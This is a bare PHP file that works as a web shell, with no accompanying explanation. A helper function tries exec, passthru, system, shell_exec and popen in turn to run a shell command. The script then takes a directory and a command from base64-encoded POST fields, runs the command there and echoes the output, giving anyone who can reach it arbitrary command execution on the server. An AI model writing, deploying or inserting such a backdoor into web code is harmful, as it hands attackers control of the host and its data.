<?php

function runCmd($in) {
    $lol = '';
    if (function_exists('exec')) {
        @exec($in, $lol);
        $lol = @join("\n", $lol);
      } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($in);
            $lol = ob_get_clean();
        } elseif (function_exists('system')) {
            ob_start();
            @system($in);
            $lol = ob_get_clean();
        } elseif (function_exists('shell_exec')) {
            $lol = shell_exec($in);
        } elseif (is_resource($f = @popen($in, "r"))) {
            $lol = "";
            while (!@feof($f))
                $lol .= fread($f, 1024);
            pclose($f);
        } else
            return "Unable to execute command\n";
        return ($lol == '' ? "Query did not return anything\n" : $lol);
}

$pth = base64_decode($_POST['d_pth']);
chdir($pth);
$content = base64_decode($_POST['d_content']);
$dt = runCmd($content);
echo($dt);
exit;